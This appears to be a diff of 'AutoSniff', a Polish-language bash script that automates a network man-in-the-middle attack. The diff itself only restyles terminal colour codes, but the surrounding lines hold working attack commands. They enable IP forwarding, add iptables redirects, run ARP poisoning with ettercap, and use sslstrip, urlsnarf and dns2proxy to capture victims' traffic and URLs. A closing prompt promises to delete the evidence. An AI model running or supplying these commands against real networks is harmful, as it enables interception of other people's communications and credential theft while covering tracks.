@@ -27,7 +27,7 @@ function logo
 	echo "    ░  ░  ░     ░   ░ ░  ▒ ░ ░ ░    ░ ░    "
 	echo "          ░           ░  ░                 "
 	echo
-	echo -e "           \e[1;33mAutoSniff\e[21;90m by LYSY v$version\e[21;39m"
+	echo -e "           \e[1;33;24mAutoSniff\e[21;90;24m by LYSY v$version\e[21;39;24m"
 	echo
 }
 
@@ -35,20 +35,20 @@ function logo
 	function session
 	{
 		logo
-		echo -e "\e[1mCzy chcesz zachować sesje? [T / N]\e[0m"
+		echo -e "\e[1;24mCzy chcesz zachować sesje? [T / N]\e[0m"
 		echo
-		echo -ne "\e[1;31mAutoSniff\e[21;0m:~# "
+		echo -ne "\e[1;31;24mAutoSniff\e[21;0m:~# "
 		read -e ODP
 		echo
 
 		# Usuwanie sesji
 		if [ $ODP = "N" ] ; then
 			rm -r /root/$SESSION/
-			echo -e "\e[1mSesja '\e[31m$SESSION\e[39m' została usunięta!\e[0m"
+			echo -e "\e[1;24mSesja '\e[31;24m$SESSION\e[39;24m' została usunięta!\e[0m"
 			echo
 			read
 		elif [ $ODP = "T" ] ; then
-			echo -e "\e[1mSesja została zapisana w '\e[31m/root/$SESSION/'\e[0m"
+			echo -e "\e[1;24mSesja została zapisana w '\e[31;24m/root/$SESSION/'\e[0m"
 			echo
 			read
 		else
@@ -57,7 +57,7 @@ function logo
 		
 		clear
 		echo
-		echo -e "\e[1;32m[+]\e[21m \e[32mWszystko pozamiatane!\e[1m Możesz spokojnie zamknąć terminal.\e[0m"
+		echo -e "\e[1;32;24[+]\e[21;24m \e[32;24mWszystko pozamiatane!\e[1;24m Możesz spokojnie zamknąć terminal.\e[0m"
 		echo
 		exit
 	}
@@ -70,23 +70,23 @@ function logo
 
 		# Pobieranie informacji
 		logo
-		echo -ne "\e[1;32mJaki interfejs wybierasz?: \e[1;39m"
+		echo -ne "\e[1;32;24mJaki interfejs wybierasz?: \e[1;39;24m"
 		read -e INTERFEJS
 		killall xterm
-		echo -ne "\e[1;32mNazwa sesji (do zapisu logu): \e[1;39m"
+		echo -ne "\e[1;32;24mNazwa sesji (do zapisu logu): \e[1;39;24m"
 		read -e SESSION
 		clear
 
 		# Glowne menu
 		logo
-		echo -e "\e[1mWybierz wersje programu:\e[21m"
+		echo -e "\e[1;24mWybierz wersje programu:\e[21;24m"
 		echo
-		echo -e "\e[1m1 - \e[94mLite\e[39m (ettercap + TCP)"
+		echo -e "\e[1;24m1 - \e[94;24mLite\e[39;24 (ettercap + TCP)"
 		echo -e "2 - Standard (ettercap + TCP + sslstrip)"
-		echo -e "3 - \e[91mPro\e[39m (ettercap + TCP + sslstrip + DNS2proxy)"
-		echo -e "4 - \e[93mMAX\e[39m (ettercap + TCP/UDP + sslstrip + DNS2proxy)\e[0m"
+		echo -e "3 - \e[91;24mPro\e[39;24m (ettercap + TCP + sslstrip + DNS2proxy)"
+		echo -e "4 - \e[93;24mMAX\e[39;24m (ettercap + TCP/UDP + sslstrip + DNS2proxy)\e[0m"
 		echo
-		echo -n -e "\e[1;31mAutoSniff\e[21;0m:~# "
+		echo -n -e "\e[1;31;24mAutoSniff\e[21;0m:~# "
 		read -e WERSJA
 
 		# Tworzenie sesji
@@ -94,10 +94,10 @@ function logo
 
 		# Podsumowanie
 		echo
-		echo -e "Interfejs sieci: '\e[1m$INTERFEJS\e[21m'"
-		echo -e "Nazwa sesji: '\e[1m$SESSION\e[21m'"
-		echo -e "Wersja programu: '\e[1m$WERSJA\e[21m'"
-		echo -e "Naciśnij \e[1mENTER\e[21m, jeżeli wszystko się zgadza."
+		echo -e "Interfejs sieci: '\e[1;24m$INTERFEJS\e[21;24m'"
+		echo -e "Nazwa sesji: '\e[1;24m$SESSION\e[21;24m'"
+		echo -e "Wersja programu: '\e[1;24m$WERSJA\e[21;24m'"
+		echo -e "Naciśnij \e[1;24mENTER\e[21;24m, jeżeli wszystko się zgadza."
 		read
 		clear
 		logo
@@ -107,14 +107,14 @@ function logo
 
 			# Ustawianie Interfejsu
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Ustawienia listy adresów...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Ustawienia listy adresów...\e[21;90;24m"
 			echo 1 > /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 			sleep 2
 
 			# Ettercap
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie Ettercap...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie Ettercap...\e[21;90;24m"
 			xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e ettercap -Tq -P autoadd -i $INTERFEJS -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp &
 			cat /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -L
@@ -125,24 +125,24 @@ function logo
 
 			# Ustawianie Interfejsu
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Ustawienia listy adresów...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Ustawienia listy adresów...\e[21;90;24m"
 			echo 1 > /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 			sleep 2
 
 			# URLsnarf
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie URLsnarf...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie URLsnarf...\e[21;90;24m"
 			urlsnarf -i $INTERFEJS | grep http > /root/$SESSION/$SESSION.txt &
 			sleep 2
 
 			# SSLstrip
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie SSLstrip...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39m Uruchamianie SSLstrip...\e[21;90;24m"
 			xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -s -k -w /root/$SESSION/$SESSION.log &
 			sleep 2
 
 			# Ettercap
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie Ettercap...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie Ettercap...\e[21;90;24m"
 			xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e ettercap -Tq -P autoadd -i $INTERFEJS -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp &
 			cat /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -L
@@ -153,29 +153,29 @@ function logo
 
 			# Ustawianie Interfejsu
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Ustawienia listy adresów...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Ustawienia listy adresów...\e[21;90;24m"
 			echo 1 > /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 			sleep 2
 
 			# URLsnarf
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie URLsnarf...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie URLsnarf...\e[21;90;24m"
 			urlsnarf -i $INTERFEJS | grep http > /root/$SESSION/$SESSION.txt &
 			sleep 2
 
 			# SSLstrip
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie SSLstrip...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie SSLstrip...\e[21;90;24m"
 			xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -s -k -w /root/$SESSION/$SESSION.log &
 			sleep 2
 
 			# DNS2Proxy
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie DNS2Proxy...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie DNS2Proxy...\e[21;90;24m"
 			xterm -geometry 75x15+1+200 -T python -e python /bin/dns2proxy-master/dns2proxy.py &
 			sleep 2
 
 			# Ettercap
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie Ettercap...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie Ettercap...\e[21;90;24m"
 			xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e ettercap -Tq -P autoadd -i $INTERFEJS -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp &
 			cat /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -L
@@ -185,30 +185,30 @@ function logo
 		elif [ $WERSJA = "4" ] ; then
 
 			# Ustawianie Interfejsu
-			echo -e "\e[1;32m[+]\e[1;39m Ustawienia listy adresów...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Ustawienia listy adresów...\e[21;90;24m"
 			echo 1 > /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 			iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
 			sleep 2
 
 			# URLsnarf
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie URLsnarf...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie URLsnarf...\e[21;90;24m"
 			urlsnarf -i $INTERFEJS | grep http > /root/$SESSION/$SESSION.txt &
 			sleep 2
 
 			# SSLstrip
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie SSLstrip...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie SSLstrip...\e[21;90;24m"
 			xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -s -k -w /root/$SESSION/$SESSION.log &
 			sleep 2
 
 			# DNS2Proxy
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie DNS2Proxy...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie DNS2Proxy...\e[21;90;24m"
 			xterm -geometry 75x15+1+200 -T python -e python /bin/dns2proxy-master/dns2proxy.py &
 			sleep 2
 
 			# Ettercap
 			echo
-			echo -e "\e[1;32m[+]\e[1;39m Uruchamianie Ettercap...\e[21;90m"
+			echo -e "\e[1;32;24m[+]\e[1;39;24m Uruchamianie Ettercap...\e[21;90;24m"
 			xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -hold -e ettercap -Tq -P autoadd -i $INTERFEJS -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp &
 			cat /proc/sys/net/ipv4/ip_forward
 			iptables -t nat -L
@@ -217,21 +217,21 @@ function logo
 		else
 			clear
 			echo
-			echo -e "\e[1;91mWybrano nieprawidłową wersję!\e[0m"
+			echo -e "\e[1;91;24mWybrano nieprawidłową wersję!\e[0m"
 			echo
 			read
 			mainsave
 		fi
 
 		echo
-		echo -e "\e[1;31m[+]\e[1;39m UWAGA!\e[0m"
-		echo -e "Po zakończeniu kliknij \e[1mENTER\e[21m by usunąć dowody i posprzatać!"
+		echo -e "\e[1;31;24m[+]\e[1;39;24m UWAGA!\e[0m"
+		echo -e "Po zakończeniu kliknij \e[1;24mENTER\e[21;24m by usunąć dowody i posprzatać!"
 		echo
 		read
 
 		# Czyszczenie i usuwanie
 		   echo
-		   echo -e "\e[32m[+]\e[0m Usuwanie i czyszczenie...\e[21;90m"
+		   echo -e "\e[32;24m[+]\e[0m Usuwanie i czyszczenie...\e[21;90;24m"
 		   echo
 		   killall python
 		   killall sslstrip
